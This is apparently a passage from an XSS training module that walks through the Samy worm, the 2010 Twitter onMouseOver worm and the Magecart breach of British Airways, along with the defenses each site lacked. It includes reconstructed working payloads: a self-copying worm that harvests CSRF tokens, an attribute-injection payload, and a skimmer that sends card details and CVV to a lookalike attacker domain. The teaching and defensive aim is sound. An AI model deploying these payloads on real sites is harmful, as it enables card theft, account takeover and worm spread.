1. The Samy Worm (MySpace, 2005)

Samy Worm
STORED XSSSELF-PROPAGATING
MySpace · Oct 4–5 2005
~1 million accounts in 20 hours

What happened: Samy Kamkar planted a stored XSS payload in his MySpace profile. Any user who viewed his profile had the payload execute in their browser. The payload: (1) added Samy as a friend, (2) added Samy to the viewer's "heroes" field, (3) copied itself into the viewer's own profile. Every infected user became a new vector. The worm spread to one million profiles overnight.

The payload problem: MySpace filtered <script> tags but allowed CSS style attributes. Samy used javascript:void(0) in a CSS background property executed via an IE-specific expression() call — background:url('javascript:void(eval(...))'). He also bypassed the word "javascript" filter by splitting it: java\nscript (newline inside the keyword).

Missing defense: No output encoding on user-supplied profile fields. Filter was string-based — trivially evaded. No CSP (didn't exist in 2005). No rate limiting on friend requests or profile writes.

What stopped it: MySpace took the site offline for several hours to clean up. Samy was convicted under the CFAA.

Reconstructed Payload (simplified, safe)

// The real worm used obfuscated eval chains. Simplified structure:
// 1. Add attacker as friend (AJAX POST with CSRF token harvested from page)
// 2. Copy self to viewer's profile (AJAX POST to profile update endpoint)
// 3. The "copy self" step is what makes it a worm

// Modern equivalent structure:
fetch('/auth/settings').then(r => r.text()).then(html => {
  const token = (html.match(/csrf.*?value="([^"]+)"/) || [])[1] || '';
  // Step 1: add attacker as friend
  fetch('/social/add-friend', {method:'POST', body:'friend=attacker&csrf='+token,
    headers:{'Content-Type':'application/x-www-form-urlencoded'}});
  // Step 2: copy worm to own profile (self-propagation)
  const worm = document.currentScript.outerHTML || '<the payload>';
  fetch('/auth/profile', {method:'POST', body:'bio='+encodeURIComponent(worm)+'&csrf='+token,
    headers:{'Content-Type':'application/x-www-form-urlencoded'}});
});

2. Twitter "onMouseOver" Worm (2010)

Twitter onMouseOver Worm
STORED XSSSELF-PROPAGATING
Twitter · Sep 21 2010
Tens of thousands of tweets in hours

What happened: A Twitter bug allowed event handler injection via the onMouseOver attribute in tweet text. The tweet onmouseover=… ran JavaScript whenever any user's mouse passed over it. The payload retweeted itself — anyone who saw the infected tweet in their timeline and moved their mouse over it spread it further.

Payload: Simply onmouseover="...." injected directly into tweet display HTML. No angle brackets required — classic attribute injection (Module 08 technique).

What it ran:

onmouseover="document.getElementById('status').value=
  document.getElementsByTagName('textarea')[0].innerHTML=
  this.textContent; document.forms[0].submit()"

In other variants, the payload auto-opened popups, redirected to porn sites, and sent DMs. Some used style=position:fixed;width:100%;height:100% to ensure the full page was the hover target — guaranteeing execution on any mouse move.

Missing defense: Output encoding failure on tweet display. The tweet text was reflected into HTML without escaping. Fixed in hours by Twitter.

See case_studies/twitter_worm.html for the annotated reconstruction.

3. Magecart (British Airways, Ticketmaster, 2018)

Magecart / British Airways Breach
SUPPLY CHAIN XSSPERSISTENT SKIMMER
British Airways · Aug–Sep 2018
~500,000 customers' card details stolen

What happened: Attackers compromised a JavaScript file served from a BA-trusted CDN (Modernizr-like utility). They injected 22 lines of JavaScript that silently skimmed payment card data from the checkout form and exfiltrated it to a lookalike domain (baways.com instead of ba.com).

Why it's XSS: The injected script ran same-origin, with full access to form fields, the DOM, and cookies. It's a supply-chain XSS — the attacker didn't find an injection point in BA's code, they injected into a dependency.

The skimmer payload (reconstructed):

// Runs on payment page, reads card form fields on submit
document.getElementById('payment-form').addEventListener('submit', function(e) {
  const card = {
    name:    document.querySelector('[name=cardName]').value,
    number:  document.querySelector('[name=cardNumber]').value,
    expiry:  document.querySelector('[name=expiry]').value,
    cvv:     document.querySelector('[name=cvv]').value,
    email:   document.querySelector('[name=email]').value,
    origin:  location.href
  };
  // Exfiltrate to attacker domain — lookalike URL
  new Image().src = 'https://baways.com/c?' + new URLSearchParams(card);
  // Don't cancel — real form still submits, victim never notices
});

Missing defense: No Subresource Integrity (SRI) on the third-party script. No CSP restricting external connections. No monitoring of outbound requests. The skimmer ran for 15 days undetected.

What would have stopped it: SRI (integrity="sha256-…" on the script tag) would have blocked the tampered file from loading. CSP connect-src restricting outbound fetches to known domains would have blocked the exfiltration.

See case_studies/magecart.html for the full skimmer reconstruction you can run against the lab checkout page.

5. Cross-Incident Patterns

IncidentXSS TypeMechanism (from M03)Missing Defense
Samy WormStored, self-propagatingEvent handler + URI scheme (CSS expression)Output encoding + word-level filter trivially evaded
Twitter WormStored, self-propagatingEvent handler injection (attribute injection, M08)Output encoding on tweet display
Magecart/BASupply chainScript tag injection (trusted third-party JS)SRI, CSP connect-src, dependency monitoring
Ticketmaster (Magecart)Supply chainSame — Inbenta chat widget compromisedSame — SRI, CSP, third-party script auditing
Pattern: In every worm case, self-propagation requires a stored XSS sink that writes back to a profile, post, or user-controlled field. Without the write-back step, a worm cannot replicate. Separating write permissions from display contexts (different subdomains, sandboxed iframes) breaks the replication loop.

6. Research Value of Historical Incidents

As a PhD researcher, historical incidents give you:

  • Ground truth: Real payloads that bypassed real defenses at a specific point in time
  • Defense gap evidence: Every incident is proof that a specific defense was absent or insufficient
  • Worm mechanics: The Samy worm is a complete case study in viral propagation — read rate, replication fidelity, detection lag
  • Supply chain threat model: BA/Magecart defines the threat model for any site that loads third-party JS (which is almost every production site)
